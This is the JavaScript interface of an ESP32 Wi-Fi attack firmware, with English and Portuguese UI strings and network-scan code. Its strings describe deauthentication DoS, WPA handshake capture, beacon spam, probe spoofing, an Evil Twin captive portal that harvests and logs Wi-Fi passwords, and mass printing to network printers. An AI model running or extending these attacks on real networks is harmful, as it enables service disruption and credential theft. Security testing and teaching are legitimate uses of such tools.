
var AttackStateEnum = { READY: 0, RUNNING: 1, FINISHED: 2, TIMEOUT: 3 };
var AttackTypeEnum  = {
    ATTACK_TYPE_PASSIVE:     0,
    ATTACK_TYPE_HANDSHAKE:   1,
    ATTACK_TYPE_DOS:         3,
    ATTACK_TYPE_BEACON_SPAM: 4,
    ATTACK_TYPE_PROBE:       5,
    ATTACK_TYPE_EVIL_TWIN:   6
};

var selectedApElements    = [];
var apSsidMap             = {};
var running_poll          = null;
var running_poll_interval = 1000;
var attack_timeout        = 0;
var time_elapsed          = 0;
var currentAttackType     = -1;

var DISCONNECTS_MGMT_AP = [
    AttackTypeEnum.ATTACK_TYPE_DOS,
AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN
];

var NO_TIMEOUT_TYPES = [
    AttackTypeEnum.ATTACK_TYPE_HANDSHAKE,
AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN
];

/* ═══════════════════════════════════════════════════════════════════════════
 *  i18n — Internationalisation
 *  Default language is English. The user's choice is stored in localStorage
 *  under "crx3_lang" and survives reboots / reconnects.
 * ═══════════════════════════════════════════════════════════════════════════ */
var DEFAULT_LANG = "en";
var currentLang  = DEFAULT_LANG;
var ATTACK_ORDER = [3, 1, 4, 5, 6];   /* order of the attack-type buttons */

var I18N = {
    en: {
        ui: {
            "common.gotIt": "Got it",
            "common.copy": "Copy",
            "common.copied": "Copied!",
            "common.unknown": "Unknown ({0})",
            "theme.toggleAria": "Toggle light / dark mode",
            "usb.reconnectAria": "Reconnect USB",

            "nav.scan": "Scan",
            "nav.attack": "Attack",
            "nav.evilTwin": "Evil Twin",
            "nav.settings": "Settings",
            "nav.about": "About",

            "scan.title": "Nearby Wi-Fi Networks",
            "scan.refresh": "Refresh Scan",
            "scan.scanning": "Scanning…",
            "scan.scanningLong": "Scanning… this may take a few seconds",
            "scan.noAps": "No access points found.",
            "scan.failed": "Scan failed. Check connection to ESP32.",
            "scan.timedOut": "Scan timed out.",

            "th.ssid": "SSID",
            "th.bssid": "BSSID",
            "th.signal": "Signal",
            "th.uptime": "Uptime",
            "th.username": "Username",
            "th.password": "Password",
            "th.status": "Status",

            "badge.selected": "{0} selected",
            "creds.zeroEntries": "0 entries",
            "creds.entryOne": "{0} entry",
            "creds.entryMany": "{0} entries",

            "running.inProgress": "Attack In Progress",
            "running.noTimeoutHint": "No timeout set — power cycle the ESP32 to stop the attack.",
            "running.stop": "■ Stop Attack",
            "running.stopping": "Stopping…",
            "running.stopFailed": "Could not stop the attack. Check the USB connection.",
            "timer.noTimeout": "no timeout",

            "result.title": "Attack Result",
            "result.newAttack": "← New Attack",
            "result.dos": "Deauthentication attack completed. Targets were disconnected during the session.",
            "result.beacon": "Beacon spam completed.",
            "result.probe": "Probe attack completed. Data captured in serial log.",
            "result.generic": "Attack completed — type {0}.",
            "status.finished": "FINISHED",
            "status.timeout": "TIMEOUT",

            "targets.title": "Selected Targets",
            "targets.noApHtml": "No AP selected — tap a row in the Scan tab",
            "targets.noApJs": "No target selected — pick a network in the Scan tab",

            "cfg.title": "Configure Attack",
            "cfg.attackType": "Attack Type",
            "cfg.attackTypeAria": "What do these attacks do?",
            "cfg.attackMethod": "Attack Method",
            "cfg.attackMethodAria": "What does this method do?",
            "cfg.selectTypeFirst": "Select an attack type first",
            "cfg.intensity": "Test Intensity",
            "cfg.intensityHint": "Frames sent per burst. Higher = more aggressive, more radio noise.",
            "cfg.fakeNetworks": "Number of Fake Networks",
            "cfg.timeoutMin": "Timeout (minutes)",
            "cfg.noTimeoutNote": "No timeout: mgmt AP drops during the attack — power cycle to stop.",
            "cfg.launch": "Launch Attack",

            "type.deauth": "Deauth",
            "type.handshake": "Handshake",
            "type.beacon": "Beacon Spam",
            "type.ghost": "Ghost Mode",
            "type.devil": "Devil Twin",

            "msg.selectTypeFirst": "Please select an attack type first.",
            "msg.selectTargetFirst": "Please select at least one target network before launching the attack.",
            "err.cannotReach": "Could not reach ESP32. Check the Wi-Fi connection.",

            "hs.notCaptured": "Handshake not captured.",
            "hs.notCapturedDesc": "Not enough EAPOL frames collected. Try moving closer to the AP or use the Broadcast method.",
            "hs.downloadPcap": "↓ Download PCAP",
            "hs.downloadHccapx": "↓ Download HCCAPX",
            "hs.rawLabel": "Raw HCCAPX Hex",

            "et.captured": "Password Captured",
            "et.wrongBefore": "Wrong attempts before correct:",
            "et.copyPassword": "Copy Password",
            "et.running": "Evil Twin running…",
            "et.wrongAttempts": "Wrong attempts:",
            "et.stopped": "Attack stopped — password not captured.",
            "et.fetchFail": "Failed to fetch Evil Twin status. ESP32 may have disconnected.",

            "settings.langTitle": "Language",
            "settings.langLabel": "Interface Language",
            "settings.title": "Update Credentials",
            "settings.newSsid": "New Network Name (SSID)",
            "settings.newSsidPh": "Enter new SSID",
            "settings.newPass": "New Password",
            "settings.newPassNote": "(min 8 chars)",
            "settings.newPassPh": "Enter new password",
            "settings.save": "Save & Restart",
            "settings.errValidation": "SSID cannot be empty and password must be at least 8 characters.",
            "settings.confirmRestart": "The device will restart. You will need to reconnect to the new network.",
            "settings.saved": "Settings saved. Reconnect to the new network after the device reboots.",
            "settings.saveFail": "Failed to save settings. Please try again.",
            "settings.netErr": "Network error — the ESP32 may already be restarting.",

            "rogue.stopLabel": "Stop",
            "rogue.stopPre": "Mgmt AP drops while running. To stop: join",
            "rogue.stopMid": "→ open",
            "rogue.yourSsid": "your SSID",
            "rogue.theSsidChosen": "the SSID you chose",
            "rogue.launchTitle": "Launch Rogue AP",
            "rogue.networkName": "Network Name (SSID)",
            "rogue.ssidPlaceholder": "e.g. Free Airport WiFi",
            "rogue.launchBtn": "Launch & Start Capturing",
            "rogue.enterSsidFirst": "Enter a network name (SSID) first.",
            "rogue.stopHint": "To stop it later: connect to \"{0}\" and open http://192.168.4.1/hydra-admin-stop",
            "rogue.confirmLaunch": "Launch a rogue AP named \"{0}\"?\n\nThis management network will go OFFLINE while it runs.\n{1}",
            "rogue.starting": "Rogue AP \"{0}\" is starting — this page will disconnect. {1}. Then reconnect here and open the Log tab.",
            "rogue.launchFail": "Failed to launch (status {0}).",
            "rogue.startingExpected": "Rogue AP \"{0}\" is starting — this page disconnected, as expected. {1}.",

            "portal.title": "Portal Page",
            "portal.fileLabel": "HTML file (.html, ≤100 KB)",
            "portal.upload": "Upload",
            "portal.preview": "Preview",
            "portal.restore": "Restore Default",
            "portal.custom": "Custom",
            "portal.default": "Default",
            "portal.unknown": "?",
            "portal.chooseFirst": "Choose an .html file first.",
            "portal.empty": "File is empty.",
            "portal.tooBig": "File is {0} KB — the limit is 100 KB.",
            "portal.confirmReplace": "Replace the Evil Twin captive portal with this file?",
            "portal.installed": "Custom portal installed.",
            "portal.uploadFail": "Upload failed: {0}",
            "portal.netErr": "Network error: {0}",
            "portal.readFail": "Could not read the file.",
            "portal.confirmRestore": "Restore the factory-default captive portal? Your custom page will be replaced.",
            "portal.restored": "Default portal restored.",
            "portal.restoreFail": "Restore failed.",

            "creds.title": "Captured Credentials",
            "creds.loading": "Loading…",
            "creds.refresh": "Refresh",
            "creds.download": "Download",
            "creds.clear": "Clear Log",
            "creds.none": "No credentials captured yet.",
            "creds.confirmClear": "Delete the saved captive portal log? This cannot be undone.",
            "creds.clearFail": "Failed to clear log.",

            "about.title": "Authors & Credits",
            "about.role.lead": "Lead Developer",
            "about.desc.lead": "CSE student at East West University, Bangladesh. Penetration testing and cyber security. Multi-target DoS engine, UI, deauth detector, and SPIFFS-based firmware integration.",
            "about.role.original": "Original Codebase",
            "about.desc.original": "Initial ESP32 Wi-Fi penetration tool implementation — the foundation this firmware is built upon.",
            "about.role.inspiration": "Inspiration",
            "about.desc.inspiration": "Inspired by deauth attack and Wi-Fi testing concepts from the ESP8266 Deauther project.",
            "about.role.ideas": "Ideas and some codes",
            "about.desc.ideas": "Inspired by the bluetooth spam attack from the Maruder and EvilAppleJuice project.",
            "nav.printer": "Printers",

            "prn.warnLabel": "Note",
            "prn.channelHint": "Joining the target network makes the crx3 AP hop channel — your phone may briefly disconnect and reconnect. That's expected; just wait a few seconds.",
            "prn.connectTitle": "Connect to Network",
            "prn.network": "Network",
            "prn.scanningNets": "Scanning networks…",
            "prn.password": "Password",
            "prn.passwordPh": "Leave empty for open networks",
            "prn.connect": "Connect",
            "prn.refreshNets": "Refresh",
            "prn.connIdle": "Not connected",
            "prn.connConnecting": "Connecting…",
            "prn.connConnected": "Connected",
            "prn.connFailed": "Connection failed",
            "prn.scanTitle": "Find Printers",
            "prn.scanHint": "Scans the connected network for devices with TCP port 9100 open.",
            "prn.scan": "Scan",
            "prn.scanning": "Scanning… {0}%",
            "prn.scanDone": "Scan complete — {0} printer(s) found.",
            "prn.scanNone": "No printers found on port 9100.",
            "prn.printTitle": "Print",
            "prn.text": "Text",
            "prn.textPh": "Type the text to print…",
            "prn.copies": "Copies",
            "prn.print": "Print",
            "prn.printSending": "Sending…",
            "prn.printDone": "Done — {0}/{1} printer(s) succeeded.",
            "prn.printFailed": "Print failed. Is the ESP32 connected to the network?",
            "prn.noTargets": "Select at least one printer first.",
            "prn.noNetwork": "Connect to a network first.",
            "prn.noText": "Enter some text to print.",

            "about.fwTitle": "Firmware Info",
            "fw.version": "Version",
            "fw.soc": "SoC",
            "fw.mgmtIp": "Mgmt IP",

            "info.attackTypesTitle": "Attack Types",
            "info.methodTitle": "Attack Method",
            "info.selectedTag": "selected",
            "info.noSel.name": "No attack selected",
            "info.noSel.desc": "Pick an attack type first, then open this again to see what each method does.",
            "info.noOpt.name": "No method options",
            "info.noOpt.desc": "This attack runs a single fixed mode — there is nothing to choose here."
        },
        attackTypes: {
            0: { name: "Passive Capture", long: "Passive Capture", desc: "" },
            3: { name: "Deauth (DoS)", long: "Deauthentication (DoS)",
                 desc: "Sends 802.11 deauthentication frames to knock clients off the target Wi-Fi. Choose a method below; the aggressive and targeted modes also use the Test Intensity slider." },
            1: { name: "Handshake", long: "WPA Handshake Capture",
                 desc: "Forces clients to reconnect and captures the WPA2 4-way handshake (.pcap / .hccapx) for offline password auditing. A connected client must be present." },
            4: { name: "Beacon Spam", long: "Beacon Spam",
                 desc: "Floods the air with fake networks, cluttering the Wi-Fi list on nearby devices. Pick a mode and how many fake SSIDs to broadcast." },
            5: { name: "Ghost Mode", long: "Ghost Mode (Probe Spam)",
                 desc: "Listens for the saved-network probe requests devices broadcast, then advertises those exact names so devices try to connect to the ESP32." },
            6: { name: "Devil Twin", long: "Evil Twin",
                 desc: "Clones the target as an open network and deauths the real AP, pushing victims to a captive portal that asks for the Wi-Fi password. Runs until a password is submitted." }
        },
        methods: {
            3: { title: "Deauth Methods", items: [
                { value: 1, name: "Normal Deauth", desc: "Classic broadcast deauth frames aimed at the whole AP. Supports multiple targets at once." },
                { value: 0, name: "BSSID Clone (Aggressive)", desc: "Raises a rogue AP with the target's BSSID so clients get confused and drop. Effective against 802.11w." },
                { value: 3, name: "Multi-Clone Deauth", desc: "Rogue AP plus a flood of space-padded SSID clones." },
                { value: 4, name: "Targeted Clients", desc: "Sniffs the stations actually connected to the AP and deauths each one directly, with a broadcast fallback. Best against stubborn devices." }
            ]},
            1: { title: "Handshake Methods", items: [
                { value: 0, name: "BSSID Clone (Aggressive)", desc: "Uses a rogue-AP clone to force reconnection while capturing." },
                { value: 1, name: "Normal Deauth", desc: "Standard deauth frames to trigger the handshake." },
                { value: 2, name: "Silent Capture", desc: "Passively waits for a handshake without sending any deauth frames — slower but stealthy." }
            ]},
            4: { title: "Beacon Spam Modes", items: [
                { value: 0, name: "Common Names", desc: "Broadcasts believable, everyday-looking SSIDs." },
                { value: 1, name: "Random Strings", desc: "Broadcasts randomly generated SSID names." },
                { value: 2, name: "Rick Roll Mode", desc: "Broadcasts SSIDs that spell out the Rick Astley lyrics." },
                { value: 3, name: "Security Names", desc: "Broadcasts alarming, security-themed SSID names." }
            ]}
        }
    },

    "pt-BR": {
        ui: {
            "common.gotIt": "Entendi",
            "common.copy": "Copiar",
            "common.copied": "Copiado!",
            "common.unknown": "Desconhecido ({0})",
            "theme.toggleAria": "Alternar modo claro / escuro",
            "usb.reconnectAria": "Reconectar USB",

            "nav.scan": "Escanear",
            "nav.attack": "Ataque",
            "nav.evilTwin": "Evil Twin",
            "nav.settings": "Ajustes",
            "nav.about": "Sobre",

            "scan.title": "Redes Wi-Fi Próximas",
            "scan.refresh": "Atualizar Busca",
            "scan.scanning": "Escaneando…",
            "scan.scanningLong": "Escaneando… isso pode levar alguns segundos",
            "scan.noAps": "Nenhum ponto de acesso encontrado.",
            "scan.failed": "Falha na busca. Verifique a conexão com o ESP32.",
            "scan.timedOut": "A busca expirou.",

            "th.ssid": "SSID",
            "th.bssid": "BSSID",
            "th.signal": "Sinal",
            "th.uptime": "Tempo lig.",
            "th.username": "Usuário",
            "th.password": "Senha",
            "th.status": "Status",

            "badge.selected": "{0} selecionado(s)",
            "creds.zeroEntries": "0 registros",
            "creds.entryOne": "{0} registro",
            "creds.entryMany": "{0} registros",

            "running.inProgress": "Ataque em Andamento",
            "running.noTimeoutHint": "Sem tempo limite definido — reinicie o ESP32 na energia para parar o ataque.",
            "running.stop": "■ Parar Ataque",
            "running.stopping": "Parando…",
            "running.stopFailed": "Não foi possível parar o ataque. Verifique a conexão USB.",
            "timer.noTimeout": "sem limite",

            "result.title": "Resultado do Ataque",
            "result.newAttack": "← Novo Ataque",
            "result.dos": "Ataque de desautenticação concluído. Os alvos foram desconectados durante a sessão.",
            "result.beacon": "Beacon spam concluído.",
            "result.probe": "Ataque de probe concluído. Dados capturados no log serial.",
            "result.generic": "Ataque concluído — tipo {0}.",
            "status.finished": "CONCLUÍDO",
            "status.timeout": "EXPIRADO",

            "targets.title": "Alvos Selecionados",
            "targets.noApHtml": "Nenhum AP selecionado — toque numa linha na aba Escanear",
            "targets.noApJs": "Nenhum alvo selecionado — escolha uma rede na aba Escanear",

            "cfg.title": "Configurar Ataque",
            "cfg.attackType": "Tipo de Ataque",
            "cfg.attackTypeAria": "O que cada ataque faz?",
            "cfg.attackMethod": "Método de Ataque",
            "cfg.attackMethodAria": "O que esse método faz?",
            "cfg.selectTypeFirst": "Selecione um tipo de ataque primeiro",
            "cfg.intensity": "Intensidade do Teste",
            "cfg.intensityHint": "Quadros enviados por rajada. Maior = mais agressivo, mais ruído no rádio.",
            "cfg.fakeNetworks": "Número de Redes Falsas",
            "cfg.timeoutMin": "Tempo limite (minutos)",
            "cfg.noTimeoutNote": "Sem tempo limite: o AP de gerência cai durante o ataque — reinicie na energia para parar.",
            "cfg.launch": "Iniciar Ataque",

            "type.deauth": "Deauth",
            "type.handshake": "Handshake",
            "type.beacon": "Beacon Spam",
            "type.ghost": "Modo Fantasma",
            "type.devil": "Devil Twin",

            "msg.selectTypeFirst": "Selecione um tipo de ataque primeiro.",
            "msg.selectTargetFirst": "Selecione pelo menos uma rede alvo antes de iniciar o ataque.",
            "err.cannotReach": "Não foi possível alcançar o ESP32. Verifique a conexão Wi-Fi.",

            "hs.notCaptured": "Handshake não capturado.",
            "hs.notCapturedDesc": "Não foram coletados quadros EAPOL suficientes. Tente se aproximar do AP ou use o método Broadcast.",
            "hs.downloadPcap": "↓ Baixar PCAP",
            "hs.downloadHccapx": "↓ Baixar HCCAPX",
            "hs.rawLabel": "Hex bruto do HCCAPX",

            "et.captured": "Senha Capturada",
            "et.wrongBefore": "Tentativas erradas antes da correta:",
            "et.copyPassword": "Copiar Senha",
            "et.running": "Evil Twin em execução…",
            "et.wrongAttempts": "Tentativas erradas:",
            "et.stopped": "Ataque parado — senha não capturada.",
            "et.fetchFail": "Falha ao obter o status do Evil Twin. O ESP32 pode ter desconectado.",

            "settings.langTitle": "Idioma",
            "settings.langLabel": "Idioma da Interface",
            "settings.title": "Atualizar Credenciais",
            "settings.newSsid": "Novo Nome da Rede (SSID)",
            "settings.newSsidPh": "Digite o novo SSID",
            "settings.newPass": "Nova Senha",
            "settings.newPassNote": "(mín. 8 caracteres)",
            "settings.newPassPh": "Digite a nova senha",
            "settings.save": "Salvar & Reiniciar",
            "settings.errValidation": "O SSID não pode ficar vazio e a senha deve ter pelo menos 8 caracteres.",
            "settings.confirmRestart": "O dispositivo vai reiniciar. Você precisará se reconectar à nova rede.",
            "settings.saved": "Ajustes salvos. Reconecte-se à nova rede após o dispositivo reiniciar.",
            "settings.saveFail": "Falha ao salvar os ajustes. Tente novamente.",
            "settings.netErr": "Erro de rede — o ESP32 pode já estar reiniciando.",

            "rogue.stopLabel": "Parar",
            "rogue.stopPre": "O AP de gerência cai enquanto roda. Para parar: conecte em",
            "rogue.stopMid": "→ abra",
            "rogue.yourSsid": "seu SSID",
            "rogue.theSsidChosen": "o SSID que você escolheu",
            "rogue.launchTitle": "Iniciar AP Falso",
            "rogue.networkName": "Nome da Rede (SSID)",
            "rogue.ssidPlaceholder": "ex.: Wi-Fi Aeroporto Grátis",
            "rogue.launchBtn": "Iniciar & Começar a Capturar",
            "rogue.enterSsidFirst": "Digite um nome de rede (SSID) primeiro.",
            "rogue.stopHint": "Para parar depois: conecte em \"{0}\" e abra http://192.168.4.1/hydra-admin-stop",
            "rogue.confirmLaunch": "Iniciar um AP falso chamado \"{0}\"?\n\nEsta rede de gerência ficará OFFLINE enquanto roda.\n{1}",
            "rogue.starting": "O AP falso \"{0}\" está iniciando — esta página vai desconectar. {1}. Depois reconecte aqui e abra a aba Log.",
            "rogue.launchFail": "Falha ao iniciar (status {0}).",
            "rogue.startingExpected": "O AP falso \"{0}\" está iniciando — esta página desconectou, como esperado. {1}.",

            "portal.title": "Página do Portal",
            "portal.fileLabel": "Arquivo HTML (.html, ≤100 KB)",
            "portal.upload": "Enviar",
            "portal.preview": "Pré-visualizar",
            "portal.restore": "Restaurar Padrão",
            "portal.custom": "Personalizado",
            "portal.default": "Padrão",
            "portal.unknown": "?",
            "portal.chooseFirst": "Escolha um arquivo .html primeiro.",
            "portal.empty": "O arquivo está vazio.",
            "portal.tooBig": "O arquivo tem {0} KB — o limite é 100 KB.",
            "portal.confirmReplace": "Substituir o portal captive do Evil Twin por este arquivo?",
            "portal.installed": "Portal personalizado instalado.",
            "portal.uploadFail": "Falha no envio: {0}",
            "portal.netErr": "Erro de rede: {0}",
            "portal.readFail": "Não foi possível ler o arquivo.",
            "portal.confirmRestore": "Restaurar o portal captive padrão de fábrica? Sua página personalizada será substituída.",
            "portal.restored": "Portal padrão restaurado.",
            "portal.restoreFail": "Falha ao restaurar.",

            "creds.title": "Credenciais Capturadas",
            "creds.loading": "Carregando…",
            "creds.refresh": "Atualizar",
            "creds.download": "Baixar",
            "creds.clear": "Limpar Log",
            "creds.none": "Nenhuma credencial capturada ainda.",
            "creds.confirmClear": "Apagar o log salvo do portal captive? Isso não pode ser desfeito.",
            "creds.clearFail": "Falha ao limpar o log.",

            "about.title": "Autores & Créditos",
            "about.role.lead": "Desenvolvedor Principal",
            "about.desc.lead": "Estudante de Ciência da Computação na East West University, Bangladesh. Testes de invasão e segurança cibernética. Motor de DoS multi-alvo, interface, detector de deauth e integração de firmware baseada em SPIFFS.",
            "about.role.original": "Código Original",
            "about.desc.original": "Implementação inicial da ferramenta de pentest Wi-Fi para ESP32 — a base sobre a qual este firmware foi construído.",
            "about.role.inspiration": "Inspiração",
            "about.desc.inspiration": "Inspirado nos conceitos de ataque deauth e testes de Wi-Fi do projeto ESP8266 Deauther.",
            "about.role.ideas": "Ideias e alguns códigos",
            "about.desc.ideas": "Inspirado no ataque de bluetooth spam dos projetos Marauder e EvilAppleJuice.",
            "nav.printer": "Impressoras",

            "prn.warnLabel": "Aviso",
            "prn.channelHint": "Ao se conectar à rede alvo, o AP crx3 muda de canal — seu celular pode desconectar e reconectar brevemente. Isso é normal; basta aguardar alguns segundos.",
            "prn.connectTitle": "Conectar à Rede",
            "prn.network": "Rede",
            "prn.scanningNets": "Escaneando redes…",
            "prn.password": "Senha",
            "prn.passwordPh": "Deixe vazio para redes abertas",
            "prn.connect": "Conectar",
            "prn.refreshNets": "Atualizar",
            "prn.connIdle": "Não conectado",
            "prn.connConnecting": "Conectando…",
            "prn.connConnected": "Conectado",
            "prn.connFailed": "Falha na conexão",
            "prn.scanTitle": "Encontrar Impressoras",
            "prn.scanHint": "Escaneia a rede conectada procurando dispositivos com a porta TCP 9100 aberta.",
            "prn.scan": "Escanear",
            "prn.scanning": "Escaneando… {0}%",
            "prn.scanDone": "Escaneamento concluído — {0} impressora(s) encontrada(s).",
            "prn.scanNone": "Nenhuma impressora encontrada na porta 9100.",
            "prn.printTitle": "Imprimir",
            "prn.text": "Texto",
            "prn.textPh": "Digite o texto para imprimir…",
            "prn.copies": "Cópias",
            "prn.print": "Imprimir",
            "prn.printSending": "Enviando…",
            "prn.printDone": "Concluído — {0}/{1} impressora(s) com sucesso.",
            "prn.printFailed": "Falha ao imprimir. O ESP32 está conectado à rede?",
            "prn.noTargets": "Selecione pelo menos uma impressora primeiro.",
            "prn.noNetwork": "Conecte-se a uma rede primeiro.",
            "prn.noText": "Digite algum texto para imprimir.",

            "about.fwTitle": "Informações do Firmware",
            "fw.version": "Versão",
            "fw.soc": "SoC",
            "fw.mgmtIp": "IP de gerência",

            "info.attackTypesTitle": "Tipos de Ataque",
            "info.methodTitle": "Método de Ataque",
            "info.selectedTag": "selecionado",
            "info.noSel.name": "Nenhum ataque selecionado",
            "info.noSel.desc": "Escolha um tipo de ataque primeiro, depois abra isto de novo para ver o que cada método faz.",
            "info.noOpt.name": "Sem opções de método",
            "info.noOpt.desc": "Este ataque roda um único modo fixo — não há nada para escolher aqui."
        },
        attackTypes: {
            0: { name: "Captura Passiva", long: "Captura Passiva", desc: "" },
            3: { name: "Deauth (DoS)", long: "Desautenticação (DoS)",
                 desc: "Envia quadros de desautenticação 802.11 para derrubar clientes do Wi-Fi alvo. Escolha um método abaixo; os modos agressivo e mirado também usam o controle de Intensidade do Teste." },
            1: { name: "Handshake", long: "Captura de Handshake WPA",
                 desc: "Força os clientes a reconectar e captura o handshake WPA2 de 4 vias (.pcap / .hccapx) para auditoria offline de senha. Precisa haver um cliente conectado." },
            4: { name: "Beacon Spam", long: "Beacon Spam",
                 desc: "Inunda o ar com redes falsas, poluindo a lista de Wi-Fi dos dispositivos próximos. Escolha um modo e quantos SSIDs falsos transmitir." },
            5: { name: "Modo Fantasma", long: "Modo Fantasma (Probe Spam)",
                 desc: "Escuta os probe requests de redes salvas que os dispositivos transmitem e passa a anunciar esses mesmos nomes, para que tentem se conectar ao ESP32." },
            6: { name: "Devil Twin", long: "Evil Twin",
                 desc: "Clona o alvo como uma rede aberta e desautentica o AP real, empurrando as vítimas para um portal captive que pede a senha do Wi-Fi. Roda até uma senha ser enviada." }
        },
        methods: {
            3: { title: "Métodos de Deauth", items: [
                { value: 1, name: "Deauth Normal", desc: "Quadros de deauth clássicos em broadcast para todo o AP. Suporta vários alvos ao mesmo tempo." },
                { value: 0, name: "Clone de BSSID (Agressivo)", desc: "Sobe um AP falso com o BSSID do alvo para confundir os clientes e derrubá-los. Eficaz contra 802.11w." },
                { value: 3, name: "Deauth Multi-Clone", desc: "AP falso mais uma enxurrada de clones de SSID preenchidos com espaços." },
                { value: 4, name: "Clientes Mirados", desc: "Fareja as estações realmente conectadas ao AP e desautentica cada uma diretamente, com broadcast de reserva. Melhor contra dispositivos teimosos." }
            ]},
            1: { title: "Métodos de Handshake", items: [
                { value: 0, name: "Clone de BSSID (Agressivo)", desc: "Usa um clone de AP falso para forçar a reconexão durante a captura." },
                { value: 1, name: "Deauth Normal", desc: "Quadros de deauth padrão para disparar o handshake." },
                { value: 2, name: "Captura Silenciosa", desc: "Espera passivamente por um handshake sem enviar nenhum quadro de deauth — mais lento, porém discreto." }
            ]},
            4: { title: "Modos de Beacon Spam", items: [
                { value: 0, name: "Nomes Comuns", desc: "Transmite SSIDs críveis, com cara de rede do dia a dia." },
                { value: 1, name: "Textos Aleatórios", desc: "Transmite nomes de SSID gerados aleatoriamente." },
                { value: 2, name: "Modo Rick Roll", desc: "Transmite SSIDs que soletram a letra do Rick Astley." },
                { value: 3, name: "Nomes de Segurança", desc: "Transmite nomes de SSID alarmantes, com tema de segurança." }
            ]}
        }
    }
};

function getLang() {
    var s = localStorage.getItem("crx3_lang");
    if (s && I18N[s]) return s;
    return DEFAULT_LANG;
}

function L() { return I18N[currentLang] || I18N[DEFAULT_LANG]; }

/* Translate a UI key, replacing {0}, {1}, … with the extra arguments. */
function t(key) {
    var dict = (I18N[currentLang] && I18N[currentLang].ui[key] != null) ? I18N[currentLang] : I18N[DEFAULT_LANG];
    var s = (dict.ui[key] != null) ? dict.ui[key] : key;
    for (var i = 1; i < arguments.length; i++) {
        s = s.replace("{" + (i - 1) + "}", arguments[i]);
    }
    return s;
}

function applyI18n() {
    document.querySelectorAll("[data-i18n]").forEach(function (el) {
        el.textContent = t(el.getAttribute("data-i18n"));
    });
    document.querySelectorAll("[data-i18n-ph]").forEach(function (el) {
        el.setAttribute("placeholder", t(el.getAttribute("data-i18n-ph")));
    });
    document.querySelectorAll("[data-i18n-title]").forEach(function (el) {
        el.setAttribute("title", t(el.getAttribute("data-i18n-title")));
    });
    document.querySelectorAll("[data-i18n-aria]").forEach(function (el) {
        el.setAttribute("aria-label", t(el.getAttribute("data-i18n-aria")));
    });
}

function setLang(lang) {
    if (!I18N[lang]) lang = DEFAULT_LANG;
    currentLang = lang;
    localStorage.setItem("crx3_lang", lang);
    document.documentElement.setAttribute("lang", lang);

    applyI18n();

    var sel = document.getElementById("language-select");
    if (sel) sel.value = lang;

    /* Re-translate dynamic bits that were injected by JS. */
    retranslateMethodOptions();
    updateSelectedChips();
    updateSelectedCountBadge();

    var rinfo = document.getElementById("running-attack-info");
    if (rinfo && currentAttackType >= 0 &&
        document.getElementById("running-section").style.display !== "none") {
        rinfo.textContent = attackTypeName(currentAttackType);
    }
    var rtype = document.getElementById("result-type");
    if (rtype && currentAttackType >= 0 &&
        document.getElementById("result-section").style.display !== "none") {
        rtype.textContent = attackTypeName(currentAttackType);
    }
}

/* Rebuild the method dropdown option labels for the current language, keeping
 * the current selection. Used after a language switch. */
function retranslateMethodOptions() {
    var at = document.getElementById("attack_type");
    if (!at || at.value === "") return;
    var type = parseInt(at.value);
    var sel  = document.getElementById("attack_method");
    if (!sel || sel.disabled) return;
    var info = (L().methods[type] || I18N[DEFAULT_LANG].methods[type]);
    if (!info) return;
    for (var i = 0; i < sel.options.length; i++) {
        if (info.items[i]) sel.options[i].text = info.items[i].name;
    }
}

function methodItems(type) {
    var m = (L().methods[type] || I18N[DEFAULT_LANG].methods[type]);
    return m ? m.items : [];
}

/* ── Boot ────────────────────────────────────────── */
window.onload = function () {
    currentLang = getLang();
    document.documentElement.setAttribute("lang", currentLang);

    var savedTheme = localStorage.getItem("hydra_theme") || "dark";
    document.documentElement.setAttribute("data-theme", savedTheme);

    applyI18n();
    var ls = document.getElementById("language-select");
    if (ls) ls.value = currentLang;

    attachRippleToAll();
    /* When loaded by the USB transport shim, defer network init() until the
     * serial link is connected (transport.js calls init() after connect). */
    if (window.CRX3_DEFER_INIT !== true) init();
};

function init() {
    getStatus();
    refreshAps();
}

/* ── Theme toggle ────────────────────────────────── */
function toggleTheme() {
    var html  = document.documentElement;
    var theme = html.getAttribute("data-theme") === "dark" ? "light" : "dark";
    html.setAttribute("data-theme", theme);
    localStorage.setItem("hydra_theme", theme);
}

/* ── Ripple effect ───────────────────────────────── */
function attachRipple(el) {
    el.addEventListener("click", function (e) {
        if (el.disabled) return;
        var rect  = el.getBoundingClientRect();
        var wave  = document.createElement("span");
        var size  = Math.max(rect.width, rect.height) * 2;
        wave.className = "ripple-wave";
        wave.style.cssText =
        "width:" + size + "px; height:" + size + "px;" +
        "left:" + (e.clientX - rect.left - size / 2) + "px;" +
        "top:"  + (e.clientY - rect.top  - size / 2) + "px;";
        el.appendChild(wave);
        setTimeout(function () { wave.remove(); }, 600);
    });
}

function attachRippleToAll() {
    document.querySelectorAll("button").forEach(attachRipple);
}

/* ── Tab switching ───────────────────────────────── */
function switchTab(name) {
    document.querySelectorAll(".nav-item").forEach(function (b) {
        b.classList.toggle("active", b.dataset.tab === name);
    });
    document.querySelectorAll(".tab-panel").forEach(function (p) {
        p.classList.toggle("active", p.id === "tab-" + name);
    });
    if (name === "rogue") { loadPortalState(); loadEvilTwinLog(); }
    if (name === "printer") { loadPrinterNetworks(); }
}

/* ── AP Scanning ─────────────────────────────────── */
function refreshAps() {
    selectedApElements = [];
    apSsidMap = {};
    updateSelectedChips();
    updateSelectedCountBadge();

    var tbody = document.getElementById("ap-list");
    tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg">' + escapeHtml(t("scan.scanningLong")) + '</td></tr>';

    var oReq = new XMLHttpRequest();
    oReq.responseType = "arraybuffer";
    oReq.timeout = 15000;

    oReq.onload = function () {
        tbody.innerHTML = "";
        var buf = oReq.response;
        if (!buf || buf.byteLength === 0) {
            tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg err">' + escapeHtml(t("scan.noAps")) + '</td></tr>';
            return;
        }
        var byteArray = new Uint8Array(buf);
        var count = Math.floor(byteArray.byteLength / 40);
        if (count === 0) {
            tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg err">' + escapeHtml(t("scan.noAps")) + '</td></tr>';
            return;
        }
        for (var i = 0; i < count; i++) {
            var offset  = i * 40;
            var ssid    = new TextDecoder("utf-8").decode(byteArray.subarray(offset, offset + 32)).replace(/\0/g, "").trim();
            var bssid   = "";
            for (var j = 0; j < 6; j++) {
                bssid += uint8ToHex(byteArray[offset + 33 + j]);
                if (j < 5) bssid += ":";
            }
            var rssiRaw = byteArray[offset + 39];
            var rssi    = rssiRaw - 255;
